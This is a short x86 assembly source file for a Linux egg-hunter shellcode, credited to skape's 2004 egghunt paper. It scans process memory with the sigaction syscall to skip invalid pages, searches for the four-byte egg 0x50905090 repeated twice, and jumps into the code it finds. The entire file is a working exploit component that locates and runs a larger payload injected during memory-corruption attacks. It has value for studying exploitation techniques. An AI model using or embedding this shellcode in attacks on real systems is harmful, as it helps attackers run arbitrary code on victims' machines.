;author: skape
;document: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;date: 09/03/2004

global _start
 
section .text
 
_start:
	or cx,0xfff
	inc ecx
	push byte +0x43
	pop eax
	int 0x80
	cmp al,0xf2
	jz 0x0
	mov eax,0x50905090
	mov edi,ecx
	scasd
	jnz 0x5
	scasd
	jnz 0x5
	jmp edi
